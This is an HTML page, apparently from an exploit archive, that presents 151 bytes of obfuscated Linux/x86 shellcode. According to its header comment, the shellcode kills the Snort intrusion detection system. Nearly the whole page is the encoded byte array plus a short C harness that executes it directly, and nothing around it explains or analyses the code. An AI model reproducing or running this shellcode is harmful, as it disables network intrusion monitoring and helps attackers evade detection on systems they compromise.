<html><head><title>Linux/x86 - kill snort - 151 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * x86 linux &quot;snort IDS&quot; shutter shellcode
 * size 151
 *
 * By nob0dy // find your own reality /
 *
 */

char snort_shutter_shellcode[] =
 &quot;\xeb\x03\x5e\xeb\x05\xe8\xf8\xff\xff&quot;
 &quot;\xff\x83\xc6\x0d\x31\xc9\xb1\x80\x80&quot;
 &quot;\x36\x01\x46\xe2\xfa\xea\x18\x2e\x74&quot;
 &quot;\x72\x73\x2e\x63\x68\x6f\x2e\x71\x6a&quot;
 &quot;\x68\x6d\x6d\x01\x2c\x31\x38\x01\x72&quot;
 &quot;\x6f\x6e\x73\x75\x01\x80\xed\x66\x2a&quot;
 &quot;\x01\x01\xea\x0c\x91\x91\x91\x91\x91&quot;
 &quot;\x91\x91\x91\x91\x91\x91\x91\x91\x54&quot;
 &quot;\x88\xe4\x57\x52\x82\xed\x11\xe9\x01&quot;
 &quot;\x01\x01\x01\x5a\x80\xc2\xca\x11\x01&quot;
 &quot;\x01\x30\xd3\xc6\x44\xf5\x01\x01\x01&quot;
 &quot;\x01\x8c\x82\x08\xee\xfe\xfe\x8c\xb2&quot;
 &quot;\xfb\xef\xfe\xfe\x88\x44\xed\x8c\x82&quot;
 &quot;\x0c\xee\xfe\xfe\x88\x44\xf1\xb9\x0a&quot;
 &quot;\x01\x01\x01\x88\x74\xe9\x8c\x4c\xe9&quot;
 &quot;\x52\x88\xf2\xcc\x81\x82\xc5\x11\x5a&quot;
 &quot;\x5f\x5c\xc2\x91\x91\x91\x91&quot;;

int main()
{
 void(* shutdown_snort)() = (void *)snort_shutter_shellcode ;
 shutdown_snort() ;
}



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
